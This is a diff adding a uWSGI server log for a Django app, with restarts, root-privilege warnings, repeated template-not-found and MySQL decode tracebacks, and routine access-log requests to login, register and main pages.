+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 94, in technical_500_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 331, in get_traceback_html
+  File "/usr/lib/python3.5/pathlib.py", line 1151, in open
+    opener=self._opener)
+  File "/usr/lib/python3.5/pathlib.py", line 1005, in _opener
+    return self._accessor.open(self, flags, mode)
+  File "/usr/lib/python3.5/pathlib.py", line 371, in wrapped
+    return strfunc(str(pathobj), *args)
+FileNotFoundError: [Errno 2] No such file or directory: '/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/templates/technical_500.html'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/deprecation.py", line 94, in __call__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 36, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 90, in response_for_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 125, in handle_uncaught_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 94, in technical_500_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 331, in get_traceback_html
+  File "/usr/lib/python3.5/pathlib.py", line 1151, in open
+    opener=self._opener)
+  File "/usr/lib/python3.5/pathlib.py", line 1005, in _opener
+    return self._accessor.open(self, flags, mode)
+  File "/usr/lib/python3.5/pathlib.py", line 371, in wrapped
+    return strfunc(str(pathobj), *args)
+FileNotFoundError: [Errno 2] No such file or directory: '/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/templates/technical_500.html'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/deprecation.py", line 94, in __call__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 36, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 90, in response_for_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 125, in handle_uncaught_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 94, in technical_500_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 331, in get_traceback_html
+  File "/usr/lib/python3.5/pathlib.py", line 1151, in open
+    opener=self._opener)
+  File "/usr/lib/python3.5/pathlib.py", line 1005, in _opener
+    return self._accessor.open(self, flags, mode)
+  File "/usr/lib/python3.5/pathlib.py", line 371, in wrapped
+    return strfunc(str(pathobj), *args)
+FileNotFoundError: [Errno 2] No such file or directory: '/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/templates/technical_500.html'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/deprecation.py", line 94, in __call__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 36, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 90, in response_for_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 125, in handle_uncaught_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 94, in technical_500_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 331, in get_traceback_html
+  File "/usr/lib/python3.5/pathlib.py", line 1151, in open
+    opener=self._opener)
+  File "/usr/lib/python3.5/pathlib.py", line 1005, in _opener
+    return self._accessor.open(self, flags, mode)
+  File "/usr/lib/python3.5/pathlib.py", line 371, in wrapped
+    return strfunc(str(pathobj), *args)
+FileNotFoundError: [Errno 2] No such file or directory: '/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/templates/technical_500.html'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/deprecation.py", line 94, in __call__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 36, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 90, in response_for_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 125, in handle_uncaught_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 94, in technical_500_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 331, in get_traceback_html
+  File "/usr/lib/python3.5/pathlib.py", line 1151, in open
+    opener=self._opener)
+  File "/usr/lib/python3.5/pathlib.py", line 1005, in _opener
+    return self._accessor.open(self, flags, mode)
+  File "/usr/lib/python3.5/pathlib.py", line 371, in wrapped
+    return strfunc(str(pathobj), *args)
+FileNotFoundError: [Errno 2] No such file or directory: '/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/templates/technical_500.html'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/wsgi.py", line 141, in __call__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/base.py", line 75, in get_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 36, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 90, in response_for_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 125, in handle_uncaught_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 94, in technical_500_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 331, in get_traceback_html
+  File "/usr/lib/python3.5/pathlib.py", line 1151, in open
+    opener=self._opener)
+  File "/usr/lib/python3.5/pathlib.py", line 1005, in _opener
+    return self._accessor.open(self, flags, mode)
+  File "/usr/lib/python3.5/pathlib.py", line 371, in wrapped
+    return strfunc(str(pathobj), *args)
+FileNotFoundError: [Errno 2] No such file or directory: '/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/templates/technical_500.html'
+[pid: 9947|app: 0|req: 3/5] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 04:38:23 2020] POST /login/ => generated 0 bytes in 28 msecs (HTTP/1.1 500) 0 headers in 0 bytes (0 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 04:49:02 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (0.0.0.0:8888).
+bind(): Address already in use [core/socket.c line 769]
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 9947|app: 0|req: 4/6] 122.96.42.165 () {42 vars in 733 bytes} [Wed Feb  5 04:49:39 2020] GET /hello/ => generated 5 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 107 bytes (1 switches on core 0)
+[pid: 9949|app: 0|req: 1/7] 122.96.42.165 () {44 vars in 755 bytes} [Wed Feb  5 04:49:43 2020] GET /hello => generated 0 bytes in 9 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 9947|app: 0|req: 5/8] 122.96.42.165 () {42 vars in 721 bytes} [Wed Feb  5 04:49:51 2020] GET / => generated 0 bytes in 6 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 9949|app: 0|req: 2/9] 122.96.42.165 () {42 vars in 733 bytes} [Wed Feb  5 04:49:51 2020] GET /login/ => generated 1121 bytes in 23 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+Internal Server Error: /login/
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./main/views.py", line 40, in login
+    if user.exists():
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/query.py", line 766, in exists
+    return self.query.has_results(using=self.db)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/query.py", line 522, in has_results
+    return compiler.has_results()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/compiler.py", line 1103, in has_results
+    return bool(self.execute_sql(SINGLE))
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/compiler.py", line 1131, in execute_sql
+    cursor = self.connection.cursor()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 256, in cursor
+    return self._cursor()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 233, in _cursor
+    self.ensure_connection()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 217, in ensure_connection
+    self.connect()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 197, in connect
+    self.init_connection_state()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/base.py", line 231, in init_connection_state
+    if self.features.is_sql_auto_is_null_enabled:
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/functional.py", line 80, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/features.py", line 82, in is_sql_auto_is_null_enabled
+    cursor.execute('SELECT @@SQL_AUTO_IS_NULL')
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/utils.py", line 103, in execute
+    sql = self.db.ops.last_executed_query(self.cursor, sql, params)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/operations.py", line 146, in last_executed_query
+    query = query.encode(errors='replace')
+AttributeError: 'str' object has no attribute 'decode'
+[pid: 9947|app: 0|req: 6/10] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 04:50:05 2020] POST /login/ => generated 116201 bytes in 69 msecs (HTTP/1.1 500) 4 headers in 130 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /var/www/big_data_web
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (0.0.0.0:8888)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from /var/www/big_data_web/uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 04:53:16 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0x19a6d40
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x19a6d40 pid: 9945 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 9945)
+spawned uWSGI worker 1 (pid: 12256, cores: 2)
+spawned uWSGI worker 2 (pid: 12257, cores: 2)
+spawned uWSGI worker 3 (pid: 12258, cores: 2)
+spawned uWSGI worker 4 (pid: 12259, cores: 2)
+invalid request block size: 21573 (max 4096)...skip
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /var/www/big_data_web
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (0.0.0.0:8888)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from /var/www/big_data_web/uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 04:53:42 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited INET address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0xb7fd40
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xb7fd40 pid: 9945 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 9945)
+spawned uWSGI worker 1 (pid: 12267, cores: 2)
+spawned uWSGI worker 2 (pid: 12268, cores: 2)
+spawned uWSGI worker 3 (pid: 12269, cores: 2)
+spawned uWSGI worker 4 (pid: 12270, cores: 2)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 05:00:06 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0x10e0250
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x10e0250 pid: 12390 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 12390)
+spawned uWSGI worker 1 (pid: 12392, cores: 2)
+spawned uWSGI worker 2 (pid: 12393, cores: 2)
+spawned uWSGI worker 3 (pid: 12394, cores: 2)
+spawned uWSGI worker 4 (pid: 12395, cores: 2)
+[pid: 12392|app: 0|req: 1/1] 122.96.42.165 () {44 vars in 764 bytes} [Wed Feb  5 05:00:54 2020] GET /login/ => generated 1121 bytes in 29 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 2/2] 122.96.42.165 () {42 vars in 739 bytes} [Wed Feb  5 05:01:04 2020] GET /register/ => generated 1369 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 12393|app: 0|req: 1/3] 122.96.42.165 () {52 vars in 964 bytes} [Wed Feb  5 05:01:29 2020] POST /register/ => generated 208 bytes in 45 msecs (HTTP/1.1 200) 3 headers in 109 bytes (1 switches on core 0)
+[pid: 12393|app: 0|req: 2/4] 122.96.42.165 () {44 vars in 778 bytes} [Wed Feb  5 05:01:31 2020] GET /login/ => generated 1121 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 3/5] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 05:01:43 2020] POST /login/ => generated 0 bytes in 12 msecs (HTTP/1.1 302) 5 headers in 201 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 4/6] 122.96.42.165 () {48 vars in 869 bytes} [Wed Feb  5 05:01:43 2020] GET /main/ => generated 50054 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 5/7] 122.96.42.165 () {48 vars in 869 bytes} [Wed Feb  5 05:02:05 2020] GET /main/ => generated 50054 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 6/8] 122.96.42.165 () {46 vars in 833 bytes} [Wed Feb  5 05:02:11 2020] GET /dp/ => generated 4277 bytes in 5 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 7/9] 122.96.42.165 () {46 vars in 835 bytes} [Wed Feb  5 05:02:17 2020] GET /main/ => generated 50054 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 8/10] 122.96.42.165 () {46 vars in 803 bytes} [Wed Feb  5 05:03:12 2020] GET /main/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 12393|app: 0|req: 3/11] 122.96.42.165 () {46 vars in 805 bytes} [Wed Feb  5 05:03:12 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 9/12] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 05:03:23 2020] POST /login/ => generated 12 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 108 bytes (1 switches on core 1)
+[pid: 12393|app: 0|req: 4/13] 122.96.42.165 () {44 vars in 774 bytes} [Wed Feb  5 05:03:40 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 10/14] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 05:09:31 2020] POST /login/ => generated 12 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 108 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 11/15] 122.96.42.165 () {44 vars in 774 bytes} [Wed Feb  5 05:09:35 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 12393|app: 0|req: 5/16] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 05:10:50 2020] POST /login/ => generated 0 bytes in 5 msecs (HTTP/1.1 302) 5 headers in 201 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 12/17] 122.96.42.165 () {48 vars in 869 bytes} [Wed Feb  5 05:10:50 2020] GET /main/ => generated 50054 bytes in 37 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 12393|app: 0|req: 6/18] 122.96.42.165 () {46 vars in 833 bytes} [Wed Feb  5 05:11:31 2020] GET /dp/ => generated 4277 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 13/19] 122.96.42.165 () {50 vars in 886 bytes} [Wed Feb  5 05:11:46 2020] GET /dp/ => generated 4277 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 12392|app: 0|req: 14/20] 122.96.42.165 () {48 vars in 785 bytes} [Wed Feb  5 05:11:55 2020] GET /favicon.ico => generated 3104 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 15/21] 122.96.42.165 () {46 vars in 834 bytes} [Wed Feb  5 05:11:55 2020] GET /main/ => generated 50054 bytes in 6 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 16/22] 122.96.42.165 () {50 vars in 887 bytes} [Wed Feb  5 05:12:04 2020] GET /main/ => generated 50054 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 12392|app: 0|req: 17/23] 122.96.42.165 () {48 vars in 787 bytes} [Wed Feb  5 05:12:11 2020] GET /favicon.ico => generated 3104 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 18/24] 122.96.42.165 () {44 vars in 785 bytes} [Wed Feb  5 05:12:27 2020] GET / => generated 4277 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 12393|app: 0|req: 7/25] 122.96.42.165 () {44 vars in 803 bytes} [Wed Feb  5 05:12:34 2020] GET /register/ => generated 1369 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 12393|app: 0|req: 8/26] 122.96.42.165 () {54 vars in 1028 bytes} [Wed Feb  5 05:13:07 2020] POST /register/ => generated 208 bytes in 11 msecs (HTTP/1.1 200) 3 headers in 109 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 19/27] 122.96.42.165 () {46 vars in 842 bytes} [Wed Feb  5 05:13:10 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 20/28] 122.96.42.165 () {54 vars in 1019 bytes} [Wed Feb  5 05:18:19 2020] POST /login/ => generated 0 bytes in 4 msecs (HTTP/1.1 302) 5 headers in 201 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 21/29] 122.96.42.165 () {48 vars in 868 bytes} [Wed Feb  5 05:18:19 2020] GET /main/ => generated 50054 bytes in 10 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 12392|app: 0|req: 22/30] 122.96.42.165 () {46 vars in 844 bytes} [Wed Feb  5 05:18:35 2020] GET /register/ => generated 1369 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 23/31] 122.96.42.165 () {44 vars in 785 bytes} [Wed Feb  5 05:21:09 2020] GET / => generated 4277 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 12392|app: 0|req: 24/32] 210.22.245.219 () {36 vars in 608 bytes} [Wed Feb  5 05:21:55 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 12:46:44 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-173-generic #203-Ubuntu SMP Wed Jan 15 02:55:01 UTC 2020
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0x2384170
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x2384170 pid: 1720 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1720)
+spawned uWSGI worker 1 (pid: 1722, cores: 2)
+spawned uWSGI worker 2 (pid: 1723, cores: 2)
+spawned uWSGI worker 3 (pid: 1724, cores: 2)
+spawned uWSGI worker 4 (pid: 1725, cores: 2)
+invalid request block size: 21573 (max 4096)...skip
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 13:12:09 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
